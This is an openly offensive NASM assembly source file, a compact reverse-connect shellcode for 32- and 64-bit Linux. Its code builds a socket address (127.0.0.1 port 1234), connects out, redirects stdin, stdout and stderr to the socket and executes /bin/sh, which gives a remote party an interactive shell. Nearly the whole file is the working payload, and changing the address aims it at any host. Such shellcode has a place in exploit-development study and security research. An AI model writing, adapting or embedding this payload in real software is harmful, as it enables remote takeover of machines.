;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
; 123 byte reverse connect shell
;
; Tested on 32 and 64-bit versions of Linux
;

    bits    32
    
    ; sa.sin_family = AF_INET;
    ; sa.sin_port   = htons(1234);
    ; sa.sin_addr   = inet_addr("127.0.0.1");
    mov     eax, ~0xD2040002 & 0xFFFFFFFF 
    mov     ebx, ~0x0100007f & 0xFFFFFFFF 
    not     eax
    not     ebx
    push    ebx
    push    eax
    push    esp         ; &sa
    
    ; step 1, create a socket
    ; x64: socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    ; x86: socketcall(SYS_SOCKET, {AF_INET, SOCK_STREAM, IPPROTO_IP});
    xor     eax, eax    ; eax = 0
    cdq                 ; rdx = IPPROTO_IP
    mov     al, 103     ; eax = sys_socketcall
    push    1
    pop     esi         ; rsi = SOCK_STREAM
    push    2
    pop     edi         ; rdi = AF_INET    
    dec     eax
    jnz     x86_socket  ; jump to x86
    mov     al, 41      ; rax = sys_socket
    syscall
    
    xchg    eax, edi    ; edi = s
    xchg    eax, esi    ; esi = 2
    
    ; step 2, assign socket handle to stdin,stdout,stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)
x64_dup2:
    mov     al, 33      ; rax = sys_dup2
    syscall
    sub     esi, 1      ; watch out for that bug ;-)
    jns     x64_dup2    ; jump if not signed
    
    ; step 3, connect to remote host
    ; connect (s, &sa, sizeof(sa));
    pop     esi         ; rsi = &sa
    mov     dl, 16      ; rdx = sizeof(sa)
    mov     al, 42      ; rax = sys_connect
    syscall    
    jmp     x84_execve

x86_socket:
    pop     ebp         ; ebp = &sa
    push    esi         ; save 1
    pop     ebx         ; ebx = SYS_SOCKET
    push    edx         ; IPPROTO_IP
    push    ebx         ; SOCK_STREAM
    push    edi         ; AF_INET
    push    esp             
    pop     ecx         ; ecx = &args 
    int     0x80

    xchg    eax, ebx    ; ebx = s
    
    ; step 2, assign socket to stdin, stdout, stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)    
    pop     ecx         ; ecx = 2
x86_dup2:
    mov     al, 63      ; eax = sys_dup2
    int     0x80 
    dec     ecx
    jns     x86_dup2    ; jump if not signed
    
    ; step 3, connect to remote host
    ; socketcall (SYS_CONNECT, {s, &sa, sizeof(sa)});
    push    16          ; sizeof(sa) 
    push    ebp         ; &sa
    push    ebx         ; s
    push    esp
    pop     ecx         ; &args
    push    3
    pop     ebx         ; ebx = sys_connect
    mov     al, 102     ; eax = sys_socketcall    
    int     0x80
    
    ; execve("/bin//sh", NULL, NULL);
x84_execve:
    cdq                 ; envp = NULL
    xor     esi, esi    ; argv = NULL
    push    eax         ; '\0'
    push    eax         ; null space
    push    eax         ; null space
    push    esp
    pop     ebx         ; ebx = "/bin//sh", 0
    push    ebx         ; save pointer to "/bin//sh", 0
    pop     edi         ; rdi = "/bin//sh", 0
    mov     dword[edi+0], '/bin'
    mov     dword[edi+4], '//sh'
    inc     eax
    jnz     x86_execve
    mov     al, 59      ; rax = sys_execve
    syscall
x86_execve:
    xor     ecx, ecx    ; argv = NULL
    mov     al, 11      ; eax  = sys_execve
    int     0x80
        
